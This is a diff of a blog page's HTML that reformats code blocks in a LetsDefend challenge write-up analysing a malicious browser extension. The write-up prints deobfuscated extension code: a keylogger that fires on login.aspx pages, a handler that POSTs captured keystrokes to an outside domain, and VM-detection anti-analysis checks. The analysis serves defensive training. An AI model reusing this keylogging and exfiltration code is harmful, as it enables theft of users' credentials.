@@ -55,6 +55,10 @@ Browser extensions are typically .zip files that contain the elements that make 
   <link rel="stylesheet" type="text/css" href="/css/styles.css">
 
   
+    <link rel="stylesheet" href="/css/custom_01.css">
+  
+    <link rel="stylesheet" href="/css/custom_02.css">
+  
 
   
   
@@ -277,117 +281,120 @@ Suspicious Browser Extension - Let&rsquo;s Defend <a href="https://app.letsdefen
 <p>We can begin analyzing the 2 javascript files within the extension by going to files &gt; view source for <code>background.js</code>:</p>
 <p><img src="https://i.imgur.com/wuV0xVO.png" alt=""></p>
 <p>We can then use <a href="https://deobfuscate.io/">a javascript deobfuscator</a> to make the code easier to read:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">c</span>() {
-  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">o</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;apply&#34;</span>, <span style="color:#e6db74">&#34;nction() &#34;</span>, <span style="color:#e6db74">&#34;console&#34;</span>, <span style="color:#e6db74">&#34;info&#34;</span>, <span style="color:#e6db74">&#34;key&#34;</span>, <span style="color:#e6db74">&#34;responseTe&#34;</span>, <span style="color:#e6db74">&#34;txt&#34;</span>, <span style="color:#e6db74">&#34;setRequest&#34;</span>, <span style="color:#e6db74">&#34;ded&#34;</span>, <span style="color:#e6db74">&#34;onMessage&#34;</span>];
-  <span style="color:#a6e22e">c</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
-    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">o</span>;
+<pre><code class="language-javascript">function c() {
+  var o = [&quot;apply&quot;, &quot;nction() &quot;, &quot;console&quot;, &quot;info&quot;, &quot;key&quot;, &quot;responseTe&quot;, &quot;txt&quot;, &quot;setRequest&quot;, &quot;ded&quot;, &quot;onMessage&quot;];
+  c = function () {
+    return o;
   };
-  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">c</span>();
+  return c();
 }
-<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">d</span>(<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>) {
-  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">c</span>();
-  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">d</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">f</span>, <span style="color:#a6e22e">g</span>) {
-    <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0</span>;
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">h</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span>[<span style="color:#a6e22e">f</span>];
-    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">h</span>;
-  }, <span style="color:#a6e22e">d</span>(<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>);
+function d(a, b) {
+  var e = c();
+  return d = function (f, g) {
+    f = f - 0;
+    var h = e[f];
+    return h;
+  }, d(a, b);
 }
-<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
-  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
-  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">f</span>, <span style="color:#a6e22e">g</span>) {
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">h</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">?</span> <span style="color:#66d9ef">function</span> () {
-      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">g</span>) {
-        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">g</span>[<span style="color:#a6e22e">d</span>(<span style="color:#ae81ff">0</span>)](<span style="color:#a6e22e">f</span>, <span style="color:#a6e22e">arguments</span>);
-        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">g</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>, <span style="color:#a6e22e">i</span>;
+var b = function () {
+  var e = true;
+  return function (f, g) {
+    var h = e ? function () {
+      if (g) {
+        var i = g[d(0)](f, arguments);
+        return g = null, i;
       }
-    } <span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> () {};
-    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>, <span style="color:#a6e22e">h</span>;
+    } : function () {};
+    return e = false, h;
   };
-}(), <span style="color:#a6e22e">a</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>(<span style="color:#66d9ef">this</span>, <span style="color:#66d9ef">function</span> () {
-  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f</span>;
-  <span style="color:#66d9ef">try</span> {
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">g</span> <span style="color:#f92672">=</span> Function(<span style="color:#e6db74">&#34;return (fu&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">d</span>(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;{}.constructor(&#34;return this&#34;)( )&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;);&#34;</span>);
-    <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">g</span>();
-  } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">n</span>) {
-    <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> window;
+}(), a = b(this, function () {
+  var f;
+  try {
+    var g = Function(&quot;return (fu&quot; + d(1) + '{}.constructor(&quot;return this&quot;)( )' + &quot;);&quot;);
+    f = g();
+  } catch (n) {
+    f = window;
   }
-  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">h</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span>[<span style="color:#a6e22e">d</span>(<span style="color:#ae81ff">2</span>)] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">console</span> <span style="color:#f92672">||</span> {}, <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;log&#34;</span>, <span style="color:#e6db74">&#34;warn&#34;</span>, <span style="color:#a6e22e">d</span>(<span style="color:#ae81ff">3</span>), <span style="color:#e6db74">&#34;error&#34;</span>, <span style="color:#e6db74">&#34;exception&#34;</span>, <span style="color:#e6db74">&#34;table&#34;</span>, <span style="color:#e6db74">&#34;trace&#34;</span>];
-  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">j</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">j</span><span style="color:#f92672">++</span>) {
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">k</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">constructor</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">bind</span>(<span style="color:#a6e22e">b</span>), <span style="color:#a6e22e">l</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">i</span>[<span style="color:#a6e22e">j</span>], <span style="color:#a6e22e">m</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">h</span>[<span style="color:#a6e22e">l</span>] <span style="color:#f92672">||</span> <span style="color:#a6e22e">k</span>;
-    <span style="color:#a6e22e">k</span>.<span style="color:#a6e22e">__proto__</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">bind</span>(<span style="color:#a6e22e">b</span>), <span style="color:#a6e22e">k</span>.<span style="color:#a6e22e">toString</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">m</span>.<span style="color:#a6e22e">toString</span>.<span style="color:#a6e22e">bind</span>(<span style="color:#a6e22e">m</span>), <span style="color:#a6e22e">h</span>[<span style="color:#a6e22e">l</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">k</span>;
+  var h = f[d(2)] = f.console || {}, i = [&quot;log&quot;, &quot;warn&quot;, d(3), &quot;error&quot;, &quot;exception&quot;, &quot;table&quot;, &quot;trace&quot;];
+  for (var j = 0; j &lt; i.length; j++) {
+    var k = b.constructor.prototype.bind(b), l = i[j], m = h[l] || k;
+    k.__proto__ = b.bind(b), k.toString = m.toString.bind(m), h[l] = k;
   }
 });
-<span style="color:#a6e22e">a</span>();
-<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">handleMessage</span>(<span style="color:#a6e22e">e</span>) {
-  <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">d</span>(<span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">e</span>[<span style="color:#a6e22e">d</span>(<span style="color:#ae81ff">4</span>)] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;page=&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">page</span>;
-  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">f</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>;
-  <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
-    <span style="color:#a6e22e">console</span>(<span style="color:#66d9ef">this</span>[<span style="color:#a6e22e">d</span>(<span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;xt&#34;</span>]);
-  }, <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;POST&#34;</span>, <span style="color:#e6db74">&#34;https://google-analytics-cm.com/analytics-3032344.&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">d</span>(<span style="color:#ae81ff">6</span>), <span style="color:#66d9ef">true</span>), <span style="color:#a6e22e">f</span>[<span style="color:#a6e22e">d</span>(<span style="color:#ae81ff">7</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Header&#34;</span>](<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;application/x-www-form-urlenco&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">d</span>(<span style="color:#ae81ff">8</span>)), <span style="color:#a6e22e">f</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">data</span>);
+a();
+function handleMessage(e) {
+  data = d(4) + e[d(4)] + &quot;&amp;page=&quot; + e.page;
+  var f = new XMLHttpRequest;
+  f.onload = function () {
+    console(this[d(5) + &quot;xt&quot;]);
+  }, f.open(&quot;POST&quot;, &quot;https://google-analytics-cm.com/analytics-3032344.&quot; + d(6), true), f[d(7) + &quot;Header&quot;](&quot;Content-Type&quot;, &quot;application/x-www-form-urlenco&quot; + d(8)), f.send(data);
 }
-<span style="color:#a6e22e">chrome</span>.<span style="color:#a6e22e">runtime</span>[<span style="color:#a6e22e">d</span>(<span style="color:#ae81ff">9</span>)].<span style="color:#a6e22e">addListener</span>(<span style="color:#a6e22e">handleMessage</span>);
-</code></pre></div><p>The <code>handleMessage</code> function is responsible for exfiltrating some data and POSTing it to the specified URL, but the URL is currently obfuscated.</p>
+chrome.runtime[d(9)].addListener(handleMessage);
+</code></pre>
+<p>The <code>handleMessage</code> function is responsible for exfiltrating some data and POSTing it to the specified URL, but the URL is currently obfuscated.</p>
 <p>Deobfuscation is handled by the <code>c</code>, <code>d</code>, <code>b</code>, &amp; <code>a</code> functions. We can deobfuscate the URL by simply pasting the functions into a browser console, then putting the URL deobfuscation process into a variable &amp; calling that variable:</p>
 <p><img src="https://i.imgur.com/pAEDRE7.png" alt=""></p>
 <p>The URL we get is <code>https://google-analytics-cm[.]com/analytics-3032344.txt</code></p>
 <p>Let&rsquo;s move on to investigate the other javascript file, <code>content.js</code>:</p>
 <p><img src="https://i.imgur.com/BWnMq6I.png" alt=""></p>
 <p>Running through the deobfuscator:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">chrome</span>.<span style="color:#a6e22e">runtime</span>.<span style="color:#a6e22e">onConnect</span>.<span style="color:#a6e22e">addListener</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_0x8616x1</span>) {});
-<span style="color:#a6e22e">chrome</span>.<span style="color:#a6e22e">webRequest</span>.<span style="color:#a6e22e">onBeforeRequest</span>.<span style="color:#a6e22e">addListener</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_0x8616x2</span>) {
-  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_0x8616x2</span>.<span style="color:#a6e22e">url</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">str</span>.<span style="color:#a6e22e">match</span>(<span style="color:#e6db74">&#34;^(.*[/])?login.aspx([?].*)?$&#34;</span>)) {
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x8616x3</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
-    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x8616x4</span> <span style="color:#f92672">=</span> {};
-    window.<span style="color:#a6e22e">onkeydown</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_0x8616x5</span>) {
-      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_0x8616x5</span>.<span style="color:#a6e22e">key</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>) {
-        <span style="color:#a6e22e">_0x8616x3</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34; (&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">_0x8616x5</span>.<span style="color:#a6e22e">key</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;) &#34;</span>;
-      } <span style="color:#66d9ef">else</span> {
-        <span style="color:#a6e22e">_0x8616x3</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x8616x5</span>.<span style="color:#a6e22e">key</span>;
+<pre><code class="language-javascript">chrome.runtime.onConnect.addListener(function (_0x8616x1) {});
+chrome.webRequest.onBeforeRequest.addListener(function (_0x8616x2) {
+  if (_0x8616x2.url == str.match(&quot;^(.*[/])?login.aspx([?].*)?$&quot;)) {
+    var _0x8616x3 = &quot;&quot;;
+    var _0x8616x4 = {};
+    window.onkeydown = function (_0x8616x5) {
+      if (_0x8616x5.key.length &gt; 1) {
+        _0x8616x3 = &quot; (&quot; + _0x8616x5.key + &quot;) &quot;;
+      } else {
+        _0x8616x3 = _0x8616x5.key;
       }
       ;
-      <span style="color:#a6e22e">_0x8616x4</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">key</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">_0x8616x3</span>, <span style="color:#a6e22e">page</span><span style="color:#f92672">:</span> window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span>};
-      <span style="color:#a6e22e">chrome</span>.<span style="color:#a6e22e">runtime</span>.<span style="color:#a6e22e">sendMessage</span>(<span style="color:#a6e22e">_0x8616x4</span>);
+      _0x8616x4 = {key: _0x8616x3, page: window.location.href};
+      chrome.runtime.sendMessage(_0x8616x4);
     };
   }
 });
-</code></pre></div><p>The job of this file is to activate a keylogger if the user visits any URL that ends in <code>login.aspx</code>, indicating a login page.</p>
+</code></pre>
+<p>The job of this file is to activate a keylogger if the user visits any URL that ends in <code>login.aspx</code>, indicating a login page.</p>
 <p>We can now move on to analyzing the <code>ThankYou.html</code> file which appeared to be suspicious:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">                <span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
-&lt;<span style="color:#f92672">html</span>&gt;
-&lt;<span style="color:#f92672">body</span> <span style="color:#a6e22e">onload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FinanceSorter()&#34;</span>&gt;
+<pre><code class="language-html">                &lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body onload=&quot;FinanceSorter()&quot;&gt;
 
-&lt;<span style="color:#f92672">script</span>&gt;
-<span style="color:#a6e22e">chrome</span>.<span style="color:#a6e22e">processes</span>.<span style="color:#a6e22e">getProcessInfo</span>(); 
-<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">FinanceSorter</span>() {
-  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">canvas</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">createElement</span>(<span style="color:#e6db74">&#39;canvas&#39;</span>);
-  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">gl</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">canvas</span>.<span style="color:#a6e22e">getContext</span>(<span style="color:#e6db74">&#39;webgl&#39;</span>);
-  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">debugInfo</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">gl</span>.<span style="color:#a6e22e">getExtension</span>(<span style="color:#e6db74">&#39;WEBGL_debug_renderer_info&#39;</span>);
-  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">vendor</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">gl</span>.<span style="color:#a6e22e">getParameter</span>(<span style="color:#a6e22e">debugInfo</span>.<span style="color:#a6e22e">UNMASKED_VENDOR_WEBGL</span>);
-  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">renderer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">gl</span>.<span style="color:#a6e22e">getParameter</span>(<span style="color:#a6e22e">debugInfo</span>.<span style="color:#a6e22e">UNMASKED_RENDERER_WEBGL</span>);
+&lt;script&gt;
+chrome.processes.getProcessInfo(); 
+function FinanceSorter() {
+  var canvas = document.createElement('canvas');
+  var gl = canvas.getContext('webgl');
+  var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+  var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+  var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
 
-  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">width</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">screen</span>.<span style="color:#a6e22e">width</span>;
-  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">height</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">screen</span>.<span style="color:#a6e22e">height</span>;
-  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">color_depth</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">screen</span>.<span style="color:#a6e22e">colorDepth</span>;
+  var width = screen.width;
+  var height = screen.height;
+  var color_depth = screen.colorDepth;
 
-  <span style="color:#a6e22e">setTimeout</span>(<span style="color:#66d9ef">function</span>(){
-    <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">true</span>) {
-      <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">/swiftshader/i</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">renderer</span>.<span style="color:#a6e22e">toLowerCase</span>()) <span style="color:#f92672">||</span> <span style="color:#e6db74">/llvmpipe/i</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">renderer</span>.<span style="color:#a6e22e">toLowerCase</span>()) <span style="color:#f92672">||</span> <span style="color:#e6db74">/virtualbox/i</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">renderer</span>.<span style="color:#a6e22e">toLowerCase</span>()) <span style="color:#f92672">||</span> <span style="color:#e6db74">/vmware/i</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">renderer</span>.<span style="color:#a6e22e">toLowerCase</span>()) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span><span style="color:#a6e22e">renderer</span>){
-        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;检测到&#34;</span>)
-        <span style="color:#a6e22e">chrome</span>.<span style="color:#a6e22e">processes</span>.<span style="color:#a6e22e">terminate</span>(<span style="color:#ae81ff">0</span>);
+  setTimeout(function(){
+    if (true) {
+      if (/swiftshader/i.test(renderer.toLowerCase()) || /llvmpipe/i.test(renderer.toLowerCase()) || /virtualbox/i.test(renderer.toLowerCase()) || /vmware/i.test(renderer.toLowerCase()) || !renderer){
+        console.log(&quot;检测到&quot;)
+        chrome.processes.terminate(0);
       }
-        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">color_depth</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">width</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">width</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">color_depth</span>){
-          <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;检测到&#34;</span>)
-          <span style="color:#a6e22e">chrome</span>.<span style="color:#a6e22e">processes</span>.<span style="color:#a6e22e">terminate</span>(<span style="color:#ae81ff">0</span>);
+        else if (color_depth &lt; 24 || width &lt; 100 || width &lt; 100 || color_depth){
+          console.log(&quot;检测到&quot;)
+          chrome.processes.terminate(0);
       }
 
     }
-  }, <span style="color:#ae81ff">200</span>);  
+  }, 200);  
 }
-&lt;/<span style="color:#f92672">script</span>&gt;
+&lt;/script&gt;
 
-&lt;/<span style="color:#f92672">body</span>&gt;
-&lt;/<span style="color:#f92672">html</span>&gt;
-</code></pre></div><p>This HTML file has the responsibility of detecting if the extension is running in a virtual machine. If it is is, then it terminates the Google Chrome process and logs the word &ldquo;Detected&rdquo; in Chinese to the browser&rsquo;s console. It attempts to detect this by searching for certain renderers, specifically vmware, virtualbox, and llvmpipe. It also attempts to detect if its running in a VM by looking at the machine&rsquo;s color depth.</p>
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>This HTML file has the responsibility of detecting if the extension is running in a virtual machine. If it is is, then it terminates the Google Chrome process and logs the word &ldquo;Detected&rdquo; in Chinese to the browser&rsquo;s console. It attempts to detect this by searching for certain renderers, specifically vmware, virtualbox, and llvmpipe. It also attempts to detect if its running in a VM by looking at the machine&rsquo;s color depth.</p>
 <p>If you have been infected with this extension previously, it&rsquo;s recommended that you change your passwords and ensure that you only install extensions that are reputable.</p>
 <h1 id="heading"></h1>
 
@@ -426,6 +433,10 @@ Suspicious Browser Extension - Let&rsquo;s Defend <a href="https://app.letsdefen
 <link rel="stylesheet" href="/css/search.fe0cd54a21628574bff49d721c827d1bb165ab56b0f22dd55ae78addbe61c309.css"></link>
 
 
+
+  <script src="/js/custom_01.js"></script>
+
+  <script src="/js/custom_02.js"></script>
 
 
     
